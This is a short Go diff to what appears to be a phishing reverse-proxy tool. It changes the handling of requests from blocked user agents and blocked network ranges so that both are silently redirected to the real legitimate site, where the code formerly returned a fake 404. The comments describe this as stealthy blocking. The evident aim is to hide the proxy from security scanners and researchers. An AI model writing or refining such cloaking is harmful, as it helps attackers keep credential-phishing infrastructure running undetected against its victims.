@@ -193,14 +193,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 for _, blocked := range blockedUserAgents {
     if strings.Contains(strings.ToLower(userAgent), strings.ToLower(blocked)) {
-        // STEALTHY OPTION 1: Return a convincing 404
-        return p.return404Response(req)
-        
-        // STEALTHY OPTION 2: Return empty 200 OK
-        // return p.returnEmptyOK(req)
-        
-        // STEALTHY OPTION 3: Redirect to real legitimate site
-        // return p.redirectToLegitSite(req)
+        // Silent stealthy blocking - redirect to real site
+        return p.redirectToLegitSite(req)
     }
 }
 
@@ -228,8 +222,8 @@ for _, blocked := range blockedUserAgents {
 
 						for _, blockedASN := range blockedASNs {
 							if record.AutonomousSystemNumber == blockedASN {
-								// Silent stealthy blocking - no logs
-								return p.return404Response(req)
+								// Silent stealthy blocking - redirect to real site
+								return p.redirectToLegitSite(req)
 							}
 						}
 					}
